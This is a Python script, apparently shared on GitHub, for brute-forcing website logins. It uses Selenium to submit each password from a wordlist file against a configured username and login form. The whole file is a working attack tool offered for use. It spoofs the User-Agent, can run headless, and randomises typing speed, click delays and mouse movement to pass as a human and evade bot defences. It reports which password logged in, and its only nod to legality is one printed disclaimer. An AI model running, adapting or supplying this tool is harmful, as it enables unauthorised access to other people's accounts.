######################################################################################################
# Title: Selenium Brute force                                                                                 #
# Author: Hosted Damola Ajibade                                                                        #
# Github : https://github.com/oyin25
# If you use the code give me the credit please #
######################################################################################################


import time
from pyfiglet import Figlet
from colorama import Fore, Back, init, Style
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import random
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import json
from bs4 import BeautifulSoup


bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE
cy = Fore.CYAN
bwh = Back.WHITE
byl = Back.YELLOW
bred = Back.RED
bgr = Back.RED


# Load configuration data from the JSON file
with open("configurations.json", "r") as config_file:
    config_data = json.load(config_file)

# Extract data from the loaded JSON
username = config_data.get("username", "")
input_name = config_data.get("element_input_name", "")
input_password = config_data.get("element_input_password", "")
button_login_xpath = config_data.get("element_button_login_xpath", "")
website = config_data.get("website", "")
error_content = config_data.get("error", "")
error_content2 = config_data.get("error2")
error_content_xpath = config_data.get("error_xpath")
input_speed_range = config_data["input_speed_range"]
click_speed_range = config_data["click_speed_range"]
headless_mode = config_data.get("headless", False)  # Default to False if not specified

# Replace this with your captured User-Agent string
custom_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"


# Create Chrome WebDriver options
chrome_options = Options()

# Set the User-Agent header to the captured User-Agent string
chrome_options.add_argument(f"user-agent={custom_user_agent}")

if headless_mode:
    chrome_options.add_argument("--headless")  # Enable headless mode
driver = webdriver.Chrome(options=chrome_options)

# Navigate to the login page
login_url = website  # Replace with the actual URL



# Read passwords from pass.txt
passwords_list = []
with open("pass.txt", "r") as file:
    for line in file:
        password = line.strip()
        passwords_list.append(password)



def header(sent):
    print(f"\n{gr}")
    custom_fig = Figlet(font='banner3')
    print(custom_fig.renderText('Hosted'))
    print(f"\n{red}")
    custom_fig2 = Figlet(font='poison')
    print(custom_fig2.renderText('Selenium BruteForce'))
    print(f"\n{res}")

    print(f"""\n{bgr}{wh} MADE BY {res} {yl}: {res}Hosted

    {bgr}{wh} Telegram {res} {yl}: {res} @Hosted_25                                     
    """
          )
    sentence = sent

    header = sentence.center(24, '*')

    print(header)

header('Make sure to be compliant with all applicable laws and terms of service when running this script.')
print(input("Press any key to continue: "))

# Function to perform login with randomized delays and mouse movements
def perform_login(username, password):
    driver.get(login_url)
    # Wait for the page to load completely
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, input_name)))

    # Wait for the Email field to become visible and ready for input
    WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, input_name)))

    # Find the Email and Password input fields by their names
    email_field = driver.find_element(By.NAME, input_name)
    password_field = driver.find_element(By.NAME, input_password)

    # Clear the old input in the fields
    # Check if the email field has a value and clear it if necessary
    # Check i the email field has a value and refresh the page if necessary
    if email_field.get_attribute("value"):
        driver.refresh()
        return  # Exit the function to prevent further actions


    # Enter the provided username (email) and password with randomized typing speed
    type_with_random_speed(email_field, username)
    type_with_random_speed(password_field, password)

    # Locate and click the "Continue" button with randomized click speed
    continue_button = driver.find_element(By.XPATH, button_login_xpath)
    click_with_random_speed(continue_button)


# Function to generate a random value within a range
def get_random_value_from_range(range_string):
    min_value, max_value = map(float, range_string.split(" - "))
    return random.uniform(min_value, max_value)

# Function to type text with randomized speed
def type_with_random_speed(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(*map(float, input_speed_range.split('-'))))  # Random typing speed

# Function to click with randomized speed and mouse movements
def click_with_random_speed(element):
    actions = ActionChains(driver)
    actions.move_to_element(element).perform()
    time.sleep(random.uniform(*map(float, click_speed_range.split('-'))))  # Random delay before click
    element.click()

# Function to check if the page contains a specific keyword
def check_for_keyword(html_content, keyword):
    soup = BeautifulSoup(html_content, 'html.parser')
    if keyword in soup.get_text():
        return True
    return False

# Function to check if the page source contains a specific word
def check_page_source_contains_word(word):
    page_html = driver.page_source
    return word in page_html

max_wait_time = 60  # Adjust this to your desired maximum wait time

for password in passwords_list:

    perform_login(username, password)



    # Check for a specific condition in the page source within the given time frame
    start_time = time.time()
    while time.time() - start_time < max_wait_time:
        if check_page_source_contains_word(error_content):
            print(f"{username} and Password {password} Error: {error_content}.")
            break  # You can choose to break out of the loop here

        # You can add more conditions as needed
        # For example, to check if the page contains "Please Change your password":
        if check_page_source_contains_word(error_content2):
            print(f"{username} and Password {password} Error: {error_content2}.")
            break

        # If the condition is not met yet, sleep for a while before checking again
        current_url = driver.current_url
        if current_url != website:
            print(f"{username} and Password {password} Successful login {current_url}.")
            # Close the WebDriver
            driver.quit()

        time.sleep(1)  # Adjust the sleep time as needed

    else:
        print(f"{username} and Password {password} Successful.")
        # Close the WebDriver
        driver.quit()



# Add a delay to keep the browser open for a specified amount of time (e.g., 10 seconds)
time.sleep(10)  # Replace with the desired delay in seconds
driver.quit()

